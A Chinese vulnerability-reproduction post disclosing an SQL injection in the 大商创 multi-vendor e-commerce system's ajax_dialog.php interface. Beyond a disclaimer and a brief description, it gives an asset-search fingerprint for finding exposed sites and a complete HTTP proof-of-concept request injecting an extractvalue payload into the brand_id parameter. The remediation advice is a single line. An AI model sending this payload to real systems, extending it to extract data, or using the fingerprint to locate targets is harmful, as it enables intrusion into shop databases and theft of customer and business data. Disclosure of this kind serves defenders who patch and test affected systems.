#  大商创多用户商城系统 SQL注入漏洞 附POC  
原创 安服仔  北风漏洞复现文库   2026-01-05 16:07  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
# 大商创多用户商城系统 SQL注入漏洞  
  
02  
  
—  
  
影响版本  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKliclWM17Et8AJKffHxQHZibqaszXHXGHXo2ekJ5pEGoETYmfvjWrqALa3jLcjsk0uh3ic2BuSU0wnQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞描述  
  
大商创多用户商城系统是一款  
功能强大的电商解决方案，支持B2B2C、S2B2C等多模式，覆盖PC、H5、小程序、APP等多端，具备商家入驻、供应链管理、分销推广等功能，可满足中大型企业独立部署或中小企业SAAS版  
快速搭  
建需求，助力企业构建全渠道电商  
生态  
。  
SQL注入漏洞存在于大商创多用户商城系统的ajax_dialog.php  
接口，攻击者可通过在特定参数中注入恶意SQL代码，绕过系统验证机制，直接访问、修改或删除数据库中的敏感信息，如用户数据、企业核心业务数据等。  
  
  
04  
  
—  
  
资产测绘  
```
body="dsc-choie"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKliclWM17Et8AJKffHxQHZiba0faC2LIWMcNsZgvFCicA2vaANPI3Ha3mENDyqIerIC43OkzBLXfIbw/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
 POC  
```
GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=extractvalue(1,concat(0x7e,md5(123)))&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0;Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Accept-Charset: utf-8
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKliclWM17Et8AJKffHxQHZibh2v8KVYISb4iaZJcb9LjziclA659oqaXsar9CrWZ1IBadMusJPUFq9tA/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建  
议  
  
升级系统至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
